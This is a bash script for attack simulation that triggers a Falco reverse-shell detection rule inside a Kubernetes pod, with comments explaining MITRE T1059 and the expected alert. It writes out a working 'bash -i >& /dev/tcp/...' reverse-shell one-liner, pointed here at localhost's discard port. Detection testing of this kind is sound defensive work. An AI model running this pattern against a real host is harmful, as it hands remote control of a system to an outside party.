#!/bin/bash
# ============================================================================
# Attack Simulation: Reverse Shell Pattern
# MITRE ATT&CK: T1059 - Command and Scripting Interpreter
# Run INSIDE a target container: kubectl exec -it <pod> -n <ns> -- sh THIS.sh
# Fires detection: detections/falco/reverse-shell.yaml   (Falco, CRITICAL)
# ============================================================================
#
# TACTIC: Execution (TA0002). A reverse shell is the classic post-exploitation move:
# instead of the attacker connecting IN to the victim (which firewalls usually block),
# the victim connects OUT to an attacker-controlled host and hands it an interactive
# shell — giving hands-on-keyboard control of the container.
#
# THIS IS AN INTENTIONAL ATTACK SIMULATION for detection testing — it is meant to be
# noisy and to trip alarms, not to do harm.
#
# SAFE BY DESIGN: this triggers the reverse-shell *syscall pattern* Falco matches
# (`bash -i` + `/dev/tcp/`) but points at localhost:9 (discard), which refuses the
# connection. No interactive shell is ever handed to a remote host.
#
# WHAT A DEFENDER SHOULD SEE: a Falco CRITICAL alert for a process whose command line
# contains both an interactive-shell flag (`bash -i`) and a raw-socket redirect to
# `/dev/tcp/`. In a real attack the destination IP/port would be attacker infra.

# Announce the action. `127.0.0.1:9` is the local discard/"null" port — nothing is
# listening, so the outbound connect is immediately refused (nothing is exfiltrated).
echo "[*] Triggering reverse-shell pattern against 127.0.0.1:9 (connection will be refused)..."
# The detonation. Breakdown of the payload:
#   bash -i                     -> start an *interactive* bash (the reverse-shell hallmark)
#   >& /dev/tcp/127.0.0.1/9     -> redirect stdout+stderr into bash's magic TCP pseudo-device
#   0>&1                        -> point stdin at that same socket, so a remote peer could type
# `timeout 3` caps it at 3s; `2>/dev/null || true` swallows the "connection refused"
# error so the script always exits cleanly. The value here is the COMMAND LINE, which
# Falco inspects (proc.cmdline) — the connection never needs to succeed to be detected.
timeout 3 bash -c 'bash -i >& /dev/tcp/127.0.0.1/9 0>&1' 2>/dev/null || true   # <-- matches cmdline

echo ""
# Operator-facing hints: which rule should fire and exactly what field it keys on.
echo "[*] Expected detection: Falco 'Reverse Shell in Container' (T1059, CRITICAL)"
echo "[*] Matched on: proc.cmdline contains '/dev/tcp/' and 'bash -i'."
